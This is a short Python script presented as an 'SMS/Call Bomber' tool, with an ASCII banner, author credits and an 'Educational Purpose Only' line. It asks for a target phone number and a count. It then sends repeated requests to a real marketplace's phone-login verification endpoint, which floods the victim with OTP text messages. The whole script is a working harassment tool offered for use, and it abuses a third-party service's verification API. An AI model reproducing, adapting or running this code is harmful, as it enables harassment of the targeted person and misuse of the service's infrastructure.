import os
import time 
import requests
import sys

# ✅ Function for animated printing
def animated_print(text, delay=0.05):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)

# ✅ Clear screen before starting
def clear_screen():
    os.system("clear")

# ✅ Header printing function
def header(text, delay=0.03):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)

# ✅ Main Program Start
def main():
    while True:
        clear_screen()
        
        print("\n\n\n")
        animated_print("\t\t\033[1;33mSWelcome To Our Sms Bombing Tools\033[0m\n", 0.1)
        time.sleep(1.8)
        clear_screen()
        
        

        logo = """
  \033[1;36m
   ____   ___   __  __  ____  
  | __ ) / _ \ |  \/  || __ ) 
  |  _ \| | | || |\/| ||  _ \ 
  | |_) | |_| || |  | || |_) |
  |____/ \___/ |_|  |_||____/ 
                             
        💣 SMS/Call Bomber 💣
 ===============================================================\033[0m
       Author   : Showrab Islam
       Facebook : Showrab Khan
       Group    : STLP
       Tools    : SMS Bomber

  \033[1;33mUse the tool for Educational Purpose Only!
  ===============================================================\033[0m
        """
        print(logo)
        break  
    
    num = input("\n\t📱 Enter target number : ")
    am = int(input("\t🔢 Enter amount        : "))

    
    sent = 0 

    while sent < am:
        try:
            r = requests.get(f'https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={num}')
            
            if r.status_code == 200:
                sent += 1
                print(f"\n\033[1;32m✔️  {sent} message sent successfully\033[0m")
            else:
                print(f"\n\033[1;31m✘ Failed to send message\033[0m")
            
            time.sleep(1)  
        except KeyboardInterrupt:
            print("\n\n\033[1;31mStopped by user.\033[0m")
            break
        except:
            print("\n\033[1;31m✘ Error occurred\033[0m")
            break

main()